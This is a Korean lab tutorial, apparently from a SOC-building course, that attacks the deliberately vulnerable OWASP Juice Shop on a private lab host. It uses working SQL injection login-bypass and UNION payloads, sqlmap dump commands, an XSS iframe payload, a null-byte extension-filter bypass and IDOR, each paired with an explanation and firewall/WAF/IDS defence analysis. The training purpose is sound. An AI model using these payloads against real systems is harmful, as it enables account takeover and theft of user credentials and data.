> **선행 강의 도달점** — [1-3-1 네트워크](/posts/socbuild-03-1-recon-network/)·[1-3-2 시스템](/posts/socbuild-03-2-recon-system/) 편에서 개방 포트와 SSH의 결함을 점검하였다. 이제 최종적으로 3000번 포트의 **웹 애플리케이션(Juice Shop) 자체**를 공략한다.
> **본 강의의 목표** — 웹 정찰로 은닉된 통로를 탐색하고, **SQL 인젝션**으로 로그인을 우회하며, **XSS**로 브라우저를 장악하고, **접근통제 결함**으로 타인의 데이터를 탈취한다. 그리고 본 3부작의 결론 — **이 웹 공격들이 왜 방화벽(OPNsense)으로 차단될 수 없는가** — 를 직접 확인한다.
> **준비 사항** — 공격자 Kali(WSL), 표적 서버, 윈도우 브라우저. 방어 장치는 여전히 부재하다.
{: .prompt-info }

> **⚠ 실습 범위 및 윤리.** SQLi·XSS는 강력한 공격이다. **학습자 본인이 소유한 실습 표적(192.168.0.30, Juice Shop)** 에만 시도한다. Juice Shop은 OWASP가 **교육 목적으로 의도적으로 취약하게 제작한** 애플리케이션이므로 자유로이 공격하여도 무방하다. 그러나 동일 기법을 허가 없이 실제 웹사이트에 적용하면 **불법**이다.
{: .prompt-danger }

## 0. 실습 구성도 — 방화벽이 "관측하지 못하는" 계층

```text
[ 공격자 Kali/브라우저 ]  ──HTTP──▶  [ Juice Shop :3000 ]  ──▶  내부 DB(SQLite)
   192.168.0.10                         192.168.0.30
        │
        └─ 공격이 "정상 HTTP 요청"의 형태를 취함
           (방화벽은 "3000번으로 향하는 정상 트래픽"으로만 인식 → 통과)
```

> **본 강의의 핵심 개념.** 네트워크·시스템 공격은 "폐쇄된 포트"로 상당수 차단되었다. 그러나 웹 공격은 다르다. SQLi·XSS는 **웹서버가 정상적으로 개방한 3000번 포트로, 정상적인 HTTP 요청의 형태로** 유입된다. 방화벽(OPNsense)은 "IP·포트"만 검사하므로 이 요청을 **정상 트래픽과 구분하지 못하고 통과**시킨다. 공격은 요청 **본문(내용)** 내부에 은닉되어 있으나, 방화벽은 내용을 검사하지 않기 때문이다. **이것이 방화벽 상위에 WAF(3단계)가 별도로 요구되는 근거이다.**
{: .prompt-tip }

> **도구 확인.** 본 강의는 `whatweb`·`nikto`·`gobuster`·`sqlmap` 과 워드리스트를 사용한다. [1-3-1의 실습 1-0](/posts/socbuild-03-1-recon-network/)에서 설치하지 않았다면 다음을 먼저 실행한다.
>
> ```bash
> sudo apt update && sudo apt install -y whatweb nikto gobuster sqlmap dirb wordlists curl
> ```
{: .prompt-warning }

점검할 웹 취약점을 OWASP Top 10 관점에서 사전 정리하면 다음과 같다.

| 실습 항목 | OWASP 분류 | 요지 |
| --- | --- | --- |
| 웹 정찰(nikto·gobuster·/ftp) | A05 보안 설정 오류 | 은닉 통로·정보 노출 탐색 |
| SQL 인젝션 | A03 인젝션 | 로그인 우회 및 DB 전량 탈취 |
| XSS | A03 인젝션 | 피해자 브라우저에서의 코드 실행 |
| 접근통제 결함(/ftp·IDOR) | A01 취약한 접근 통제 | 타인의 파일·데이터 열람 |
| 보안 헤더 미비 | A05 보안 설정 오류 | 방어 헤더의 부재 |

## 1. 실습: 웹 정찰

공격에 앞서 애플리케이션의 **구조와 은닉된 통로**를 파악한다.

> ### 실습 1-1. 구현 기술 식별 (whatweb)
{: .prompt-tip }

```bash
whatweb http://192.168.0.30:3000
```

출력에서 `Node.js`·`Express`·`AngularJS` 등의 기술 스택이 드러난다. 공격자는 "본 애플리케이션이 Node/Express + Angular SPA"임을 파악하고 그에 부합하는 공격을 준비한다.

> ### 실습 1-2. robots.txt 및 은닉 디렉터리
{: .prompt-tip }

```bash
curl -s http://192.168.0.30:3000/robots.txt
```

`Disallow: /ftp` 와 같은 항목이 관측된다. robots.txt는 "검색엔진이 수집하지 않아야 할 경로"를 기재하는 파일이나, **역설적으로 공격자에게 "이곳에 무언가 존재한다"는 단서**를 제공한다.

> ### 실습 1-3. 디렉터리 무차별 탐색 (gobuster)
>
> **목적** 링크로 노출되지 않은 서버 경로를 사전으로 탐색한다.
{: .prompt-tip }

```bash

gobuster dir -u http://192.168.0.30:3000 -w /usr/share/wordlists/dirb/common.txt -t 20 --exclude-length 9393 
 
```

| 옵션 | 의미 |
| --- | --- |
| `dir` | 디렉터리/파일 탐색 모드 |
| `-u` | 대상 URL |
| `-w` | 사용할 사전 파일(경로 후보 목록) |
| `-t 20` | 동시 요청 20 |

> `/usr/share/wordlists/dirb/common.txt` 가 존재하지 않으면 `sudo apt install -y dirb wordlists` 를 먼저 실행한다.
{: .prompt-info }

`/ftp`·`/rest`·`/api`·`/assets`·`/metrics` 등의 경로가 탐색된다. 특히 **`/ftp`** 는 후반부(4장)에서 정밀 점검할 중요한 통로이다.

> ### 실습 1-4. 자동 웹 취약점 스캐너 (nikto)
{: .prompt-tip }

```bash
nikto -h http://192.168.0.30:3000
```

nikto는 수백 건의 요청을 전송하여 **누락된 보안 헤더, 흥미로운 파일, 알려진 취약 경로**를 일괄 보고한다.

### 이 절차를 수행하는 이유 / 공격자가 획득하는 정보

- **기술 스택**(Node/Express/Angular) → 맞춤형 공격 준비
- **은닉 경로**(/ftp·/rest 등) → 링크에 부재한 공격면 확보
- **누락된 보안 설정** → 취약 지점의 지도화

### 점검 항목 (웹 정찰)

- [ ] 애플리케이션의 기술 스택을 파악하였는가?
- [ ] robots.txt·gobuster로 은닉 경로(특히 `/ftp`)를 탐색하였는가?
- [ ] nikto가 지적한 누락 헤더·취약 경로를 기록하였는가?

> ### 🛡 OPNsense를 통한 차단 가능성
>
> **거의 차단할 수 없다.** nikto·gobuster는 전부 **정상 HTTP 요청(GET /경로)** 의 형태이다. 방화벽은 3000번으로 향하는 이 요청들을 정상 트래픽으로 인식하여 통과시킨다. 다만 **요청량이 비정상적으로 많다**는 점(수백~수천 건)을 Suricata IDS가 "스캐너 행위"로 탐지할 수 있으며(예: `ET SCAN Nikto`), 5단계에서 AI가 해당 IP를 차단한다. **요청 내용을 검사하여 차단하려면 3단계 WAF가 요구된다.**
{: .prompt-warning }

## 2. 실습: SQL 인젝션 (SQLi)

본 3부작에서 **가장 중요한 공격**이다. 웹 애플리케이션이 사용자 입력을 데이터베이스 질의(SQL)에 그대로 결합할 때, 공격자가 입력에 SQL 구문을 삽입하여 **질의의 의미 자체를 변조하는** 공격이다.

### 2-1. 로그인 우회 — 비밀번호 없이 관리자 로그인

> ### 실습 2-1. 브라우저를 통한 로그인 우회
>
> **목적** 비밀번호를 알지 못한 채 관리자 계정으로 로그인한다.
{: .prompt-tip }

**1단계.** 윈도우 브라우저에서 `http://192.168.0.30:3000` 에 접속한 뒤 우측 상단 **Account → Login** 을 선택한다.

**2단계.** 이메일 입력란에 다음을 입력하고, 비밀번호란에는 **임의의 값**을 입력한다.

```text
' OR 1=1--
```

**3단계.** Login을 클릭하면 **관리자(admin@juice-sh.op) 계정으로 로그인된다.**

> 정상 동작하지 않을 경우 이메일란에 `admin@juice-sh.op'--` 를 입력한다. (특정 계정을 지목하여 해당 계정의 비밀번호 검사를 주석 처리하는 방식)
{: .prompt-info }

동일한 공격을 명령줄로도 수행할 수 있다.

```bash
curl -s -X POST http://192.168.0.30:3000/rest/user/login \
  -H 'Content-Type: application/json' \
  -d "{\"email\":\"' OR 1=1--\",\"password\":\"x\"}"
```

응답 JSON에 `authentication` 토큰이 포함되어 수신되면 우회에 성공한 것이다.

### 이 공격이 성립하는 이유

로그인 검사 질의는 통상 다음과 같이 구성된다.

```sql
SELECT * FROM Users WHERE email = '입력된이메일' AND password = '입력된비밀번호';
```

여기에 이메일로 `' OR 1=1--` 를 입력하면 질의는 다음과 같이 변조된다.

```sql
SELECT * FROM Users WHERE email = '' OR 1=1--' AND password = 'x';
```

- `OR 1=1` → **항상 참**(모든 행이 조건을 충족)
- `--` → 이후의 `AND password=...` 를 **주석 처리**(무시)

결과적으로 "비밀번호 검사"가 소거되어 **테이블의 첫 번째 사용자(=관리자)** 로 로그인된다.

### 공격자가 획득하는 정보

- **관리자 계정 탈취** — 비밀번호를 알지 못하여도 관리자 권한 획득
- 관리자 화면 접근, 타 사용자 데이터 조작 등 후속 공격의 발판

### 2-2. 데이터 탈취 — 사용자 DB 전량 유출

로그인 우회는 시작에 불과하다. 검색 기능의 SQLi를 통하여 **DB 내용 자체**를 추출할 수 있다.

> ### 실습 2-2. 검색 UNION 인젝션을 통한 계정·비밀번호 해시 탈취
{: .prompt-tip }

브라우저 검색란(돋보기)에 다음을 입력하거나, URL로 직접 요청한다.

```text
')) UNION SELECT id, email, password, '4','5','6','7','8','9' FROM Users--
```

```bash
curl -s "http://192.168.0.30:3000/rest/products/search?q='))%20UNION%20SELECT%20id,email,password,'4','5','6','7','8','9'%20FROM%20Users--"
```

응답에 **사용자 이메일과 비밀번호 해시**가 상품 목록에 결합되어 반환된다.

> **컬럼 수가 9개인 이유.** UNION은 **원 질의와 컬럼 수가 일치하여야** 동작한다. Juice Shop의 상품 검색은 9개 컬럼을 반환하므로 UNION 측 또한 9개(`id, email, password, '4'...'9'`)로 맞춘다. 실습 환경에서 개수가 불일치하여 오류가 발생하면, 컬럼 수를 하나씩 증감하여 조정한다. (참고: Juice Shop의 DB는 **SQLite** 이므로 `information_schema` 대신 `FROM Users` 와 같이 실제 테이블명을 사용한다.)
{: .prompt-info }

### 2-3. 자동화 — sqlmap

> ### 실습 2-3. sqlmap을 이용한 SQLi 자동 탐지·추출
{: .prompt-tip }

```bash
sqlmap -u "http://192.168.0.30:3000/rest/products/search?q=test" --batch --dbms=sqlite
# 취약성 확인 후 테이블·데이터 추출
sqlmap -u "http://192.168.0.30:3000/rest/products/search?q=test" --batch --dbms=sqlite --tables
sqlmap -u "http://192.168.0.30:3000/rest/products/search?q=test" --batch --dbms=sqlite -T Users --dump
```

| 옵션 | 의미 |
| --- | --- |
| `sqlmap` | SQLi 자동 탐지·악용 도구 |
| `-u` | 대상 URL(취약 파라미터 `q` 포함) |
| `--batch` | 질의에 기본값으로 자동 응답(무인 진행) |
| `--dbms=sqlite` | DB 종류를 지정하여 탐지 속도·정확도 향상 |
| `--tables` / `-T Users --dump` | 테이블 목록 / `Users` 테이블 전량 추출 |

### 공격자가 획득하는 정보

- **전체 사용자 계정과 비밀번호 해시** → 오프라인 크랙 후 타 서비스 로그인(자격증명 재사용 공격)
- 주문·결제 등 **모든 민감 데이터** 탈취

### 점검 항목 (SQLi)

- [ ] 로그인 우회(`' OR 1=1--`)가 성립하는가?
- [ ] 검색 UNION으로 타 테이블(Users)의 데이터가 유출되는가?
- [ ] 입력값을 DB 질의에 결합할 때 **파라미터 바인딩(prepared statement)** 을 사용하는가? (근본 방어)

> ### 🛡 OPNsense를 통한 차단 가능성
>
> **불가능하다 — 방화벽으로는 결코 차단할 수 없다.** `' OR 1=1--` 는 3000번 포트로 향하는 **정상적인 HTTP 요청**이다. 방화벽은 IP·포트만 검사하므로 이 요청을 실제 로그인과 구분하지 못하고 통과시킨다. 공격은 요청 **본문 내부의 문자열**에 은닉되어 있으나, 방화벽은 본문을 검사하지 않는다.
> **이 때문에 3단계 WAF(ModSecurity)가 요구된다.** WAF는 HTTP 요청의 **내용**을 규칙(CRS)으로 검사하여 `UNION SELECT`·`OR 1=1` 등의 SQLi 패턴을 탐지하고 **403으로 차단**한다. 한편 2단계 Suricata IDS도 일부 SQLi 시그니처를 **탐지**하나(경보), 확실한 **차단**은 WAF의 역할이다. → 이 한 문장이 본 강의 전체 5단계 구조의 근거이다.
{: .prompt-warning }

## 3. 실습: XSS (Cross-Site Scripting)

SQLi가 **서버의 DB**를 겨냥한다면, XSS는 **피해자의 브라우저**를 겨냥한다. 공격자가 웹페이지에 악성 스크립트를 삽입하여, 그 페이지를 열람하는 타 사용자의 브라우저에서 코드를 실행시키는 공격이다.

> ### 실습 3-1. 검색란 XSS
>
> **목적** 검색란에 스크립트를 삽입하여 브라우저에서 실행시킨다.
{: .prompt-tip }

브라우저 검색란에 다음을 입력한다.

```html
<iframe src="javascript:alert(`xss`)">
```

경고창(alert)이 출력되면 성공이며, 이는 **입력한 스크립트가 브라우저에서 그대로 실행**되었음을 의미한다.

### 이 공격이 성립하는 이유

애플리케이션이 사용자 입력(검색어)을 **화면에 출력할 때 무해화(이스케이프)하지 않고** HTML에 그대로 삽입하기 때문이다. 그 결과 `<iframe ...>` 이 문자열이 아니라 **실제 태그로 해석되어** 실행된다.

### 공격자가 획득하는 정보

- 피해자의 **세션 쿠키·토큰 탈취** → 계정 도용
- 위조 로그인 창을 출력하는 **피싱**, 악성 사이트로의 **강제 이동**
- 피해자 권한으로 **임의 요청** 실행

### 점검 항목 (XSS)

- [ ] 검색·게시 등의 입력값이 화면에 **그대로 반사**되지 않는가?
- [ ] 출력 시 HTML 이스케이프/살균(sanitize)을 수행하는가?
- [ ] CSP(Content-Security-Policy) 헤더가 설정되어 있는가?

> ### 🛡 OPNsense를 통한 차단 가능성
>
> **불가능하다 — SQLi와 동일한 이유로 방화벽으로는 차단할 수 없다.** XSS 페이로드 또한 정상 HTTP 요청 내부의 문자열이다. **3단계 WAF**가 `<script>`·`<iframe src="javascript:` 등의 패턴을 검사하여 차단하고, CSP와 같은 응답 헤더로 방어를 보강한다. IDS는 일부 패턴을 탐지할 수 있다.
{: .prompt-warning }

## 4. 실습: 접근통제 결함 — 타인의 파일·데이터 탈취

인증(로그인)은 "누구인가", 인가/접근통제는 "그것을 열람할 자격이 있는가"를 판별한다. 접근통제가 허술하면 **로그인하지 않고도, 혹은 일반 사용자가** 열람하여서는 안 될 자원에 접근하게 된다.

> ### 실습 4-1. 노출된 /ftp 디렉터리
>
> **목적** 1장에서 탐색한 `/ftp` 경로에서 민감 파일을 열람·다운로드한다.
{: .prompt-tip }

브라우저에서 `http://192.168.0.30:3000/ftp` 에 접속하면 서버 내부 파일 목록이 그대로 노출된다.

```bash
curl -s http://192.168.0.30:3000/ftp/acquisitions.md
```

`acquisitions.md`(기밀 인수 계획) 등의 **내부 문서가 인증 없이** 다운로드된다.

> **한 단계 심화 — 확장자 필터 우회.** Juice Shop은 `.md`·`.pdf` 만 허용하도록 제한하였으나, **널바이트(`%2500`)** 를 삽입하여 `package.json.bak%2500.md` 와 같이 요청하면 필터를 우회하여 백업 파일까지 탈취할 수 있다. "차단하였다고 간주한 것이 어떻게 우회되는가"의 전형적 사례이다.
{: .prompt-info }

> ### 실습 4-2. 타 사용자 자원 열람 (IDOR)
>
> **목적** 본인의 자원이 아닌 자원 번호(ID)를 변경하여 타인의 데이터에 접근한다.
{: .prompt-tip }

로그인 후 본인의 장바구니가 `/rest/basket/1` 이라면, 번호를 `2`·`3` 으로 변경하여 요청함으로써 **타인의 장바구니**가 노출되는지 확인한다. 이처럼 "자원 번호만 변경하여" 타인의 데이터에 접근하는 것을 **IDOR(안전하지 않은 직접 객체 참조)** 라 한다.

### 이 공격을 수행하는 이유 / 공격자가 획득하는 정보

- 인증 없이 **기밀 문서·백업 파일** 확보(설계·계정·소스 유출)
- 자원 번호 조작을 통한 **타 사용자의 개인정보·주문내역** 열람

### 점검 항목 (접근통제)

- [ ] `/ftp` 등의 경로가 **인증 없이** 열람되지 않는가?
- [ ] 확장자·경로 필터가 널바이트 등으로 우회되지 않는가?
- [ ] 자원 번호(ID) 변경 시 **소유자 검증**을 수행하는가?(IDOR 방어)

> ### 🛡 OPNsense를 통한 차단 가능성
>
> **불가능하다.** `/ftp/acquisitions.md`·`/rest/basket/2` 요청은 모두 정상 HTTP GET이다. 방화벽은 경로나 소유권을 해석하지 못한다. **접근통제는 원칙적으로 애플리케이션이 자체적으로 검증하여야** 하며, 보조적으로 WAF가 특정 경로(`/ftp`)나 널바이트 패턴을 차단할 수 있다. 방화벽의 역할은 이 지점에서 사실상 부재하다.
{: .prompt-warning }

## 5. (보강) 보안 설정 미비

```bash
curl -sI http://192.168.0.30:3000 | grep -iE 'content-security-policy|strict-transport|x-frame|x-content'
```

- **CSP·HSTS 부재** → XSS·중간자 공격에 취약
- 통신이 **HTTP(비암호화)** → 동일 네트워크에서 트래픽 도청 가능(로그인 정보가 평문으로 전송)

이러한 설정 미비는 앞선 공격들의 위력을 증대시킨다. 방어는 **응답 헤더 추가(WAF/웹서버) 및 HTTPS 적용**으로 수행한다.

## 6. 3부작 종합 — "무엇을 방화벽으로 차단하고, 무엇을 차단할 수 없는가"

> ### 🖼 필요 이미지 1
> `' OR 1=1--` 로 관리자 로그인에 성공한 Juice Shop 화면(우측 상단에 admin 계정 표시)을 캡처하여 삽입한다.
{: .prompt-info }

> ### 🖼 필요 이미지 2
> 검색란 XSS로 `alert` 경고창이 출력된 화면, 또는 `/ftp` 파일 목록이 노출된 화면을 캡처하여 삽입한다.
{: .prompt-info }

### 🛡 세 계층 종합표 — OPNsense(방화벽) vs WAF vs IDS

본 3부작에서 확인한 모든 공격을 "무엇으로 차단하는가" 기준으로 정리한다. **이 표가 향후 5단계 전체를 구축하는 근거이다.**

| 공격             | 계층     | OPNsense(방화벽, 2단계) | WAF(3단계)      | IDS/SIEM/AI(2·4·5단계) |
| -------------- | ------ | ------------------ | ------------- | -------------------- |
| 포트 스캔          | L4     | ✅ 차단(default deny) | —             | 탐지·자동차단              |
| ping/OS 정찰     | L3     | ✅ 차단               | —             | 탐지                   |
| SSH 무차별 대입     | L4+인증  | ✅ 접근차단(WAN→22)     | —             | 탐지·자동차단              |
| 노출 관리서비스       | L4     | ✅ 차단               | —             | 탐지                   |
| **SQL 인젝션**    | **L7** | ✖ **차단 불가**        | ✅ **차단(403)** | 일부 탐지                |
| **XSS**        | **L7** | ✖ **차단 불가**        | ✅ **차단(403)** | 일부 탐지                |
| **접근통제/IDOR**  | **L7** | ✖ **차단 불가**        | △ 일부(경로/패턴)   | 탐지                   |
| 웹 스캐너(nikto 등) | L7     | ✖ 개별요청 통과          | ✅ 차단          | ✅ 다량요청 탐지            |

> **3부작의 결론.** 네트워크·시스템 공격(상단)은 **방화벽(OPNsense)만으로도 상당 부분 차단된다.** 이것이 2단계에서 방화벽을 우선 도입하는 근거이다. 그러나 웹 공격(SQLi·XSS·접근통제)은 **정상 HTTP 요청의 형태로 방화벽을 그대로 통과**한다. 방화벽이 요청 "내용"을 검사하지 않기 때문이다.
> - **내용을 검사하여 차단 → 3단계 WAF(ModSecurity)**
> - **경보를 단일 지점에 집약하여 상관분석 → 4단계 SIEM(Wazuh)**
> - **경보를 사람의 개입 없이 차단으로 연결 → 5단계 AI(Ollama)**
>
> 즉, 무방비 상태에서 관철된 이 공격들을 **후속 단계마다 하나씩 재실행**하며 "이번에는 차단되는가"를 직접 비교하게 된다. 이것이 본 강의의 학습 방식이다.
{: .prompt-tip }

### 3부작 전체 최종 점검표

- [ ] (네트워크) 개방 포트를 전수 확인하고 결과를 보존하였다
- [ ] (시스템) 약한 SSH 비밀번호가 관철되는 것을 확인하였다
- [ ] (웹) SQLi 로그인 우회·데이터 탈취를 성공시켰다
- [ ] (웹) XSS·접근통제 결함을 확인하였다
- [ ] 각 공격이 **방화벽으로 차단되는지/되지 않는지**를 표로 정리하였다
- [ ] 이 결과(before)를 보존하여, 2단계 이후 **after**와 비교할 준비를 완료하였다

## 다음 강의 — 2단계로

여기까지 표적은 **완전한 무방비 상태**이며, 그 실태를 세 계층으로 낱낱이 확인하였다. 다음 **2단계 「경계 방어 — OPNsense와 Suricata」** 에서는 공격자(Kali)와 표적(Juice Shop) 사이에 **방화벽 OPNsense**를 배치하여

```text
[ Kali ] ──WAN── [ OPNsense 방화벽 ] ──LAN── [ Juice Shop ]
```

구조를 구성하고, **무방비 상태에서 관철된 공격들을 동일하게 재실행**한다. 포트 스캔과 SSH 접근이 어떻게 차단되는지, 그리고 SQLi·XSS는 어째서 **여전히 관철되는지**(→ 3단계 WAF의 필요성)를 직접 비교하게 된다.
